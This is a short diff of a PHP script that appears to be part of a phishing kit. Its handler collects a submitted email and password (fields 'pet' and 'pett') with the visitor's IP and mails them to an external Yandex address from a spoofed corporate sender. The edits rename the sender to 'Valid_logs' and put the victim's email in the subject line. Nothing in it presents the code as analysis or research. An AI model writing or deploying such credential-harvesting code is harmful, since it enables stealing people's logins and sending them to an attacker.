@@ -36,7 +36,7 @@ class Email{
 		$mail->Port = 465;
 
 		$mail->From = 'sap.notify@morshedy.com';
-		$mail->FromName = "Regex Cyber Team";
+		$mail->FromName = "Valid_logs";
 		$mail->addAddress('only1r00t@yandex.ru');
 
 		$mail->isHTML(true);
@@ -60,7 +60,7 @@ if(isset($_POST)){
     $data['email'] = $email->clean($_REQUEST['pet']);
     $data['pass'] = $email->clean($_REQUEST['pett']);
     $data['ip'] = $email->getIp();
-    $data['subject'] = "Valid_Log";
+    $data['subject'] = ".$data['email']. log";
     $data['message'] =
 		"
 		<html>
